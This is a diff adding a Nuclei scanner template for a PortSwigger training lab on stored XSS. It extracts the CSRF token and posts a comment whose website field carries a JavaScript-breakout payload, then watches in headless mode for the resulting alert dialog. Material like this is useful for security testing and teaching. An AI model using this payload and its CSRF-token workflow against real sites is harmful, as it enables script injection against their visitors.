@@ -1,0 +1,52 @@
+# run with flag $ nuclei -headless
+# Нагрузка отправляется в postId=1 
+
+id: lab-href-attribute-double-quotes-html-encoded
+
+info:
+  name: xss_lab-href-attribute-double-quotes-html-encoded
+  author: FIR_UIII
+  severity: high
+  description: Stored XSS into anchor href attribute with double quotes HTML-encoded
+  tags: XSS,portswigger,csrf
+
+requests:
+  - raw:
+    - |
+      GET {{Path}}/post?postId=1 HTTP/1.1
+      Host: {{Hostname}}
+
+    - |
+      POST {{Path}}/post/comment HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      
+      csrf={{csrf}}&postId=1&comment=DEMO_nuclei&name=DEMO_nuclei&email=demo%40fir.uiii&website=http://foo.bar&apos;);alert(11111);//
+
+    redirects: true
+    cookie-reuse: true      
+    extractors:
+      - type: regex
+        name: csrf
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - 'name="csrf" value="([a-zA-Z0-9]{32})'
+    req-condition: true
+
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/post?postId=1"
+        action: navigate
+
+      - action: waitdialog
+        name: reflected_topicId_query
+
+    matchers:
+      - type: dsl
+        dsl:
+          - reflected_topicId_query == true
+          - reflected_topicId_query_message == "11111" # 3+4
+        condition: and
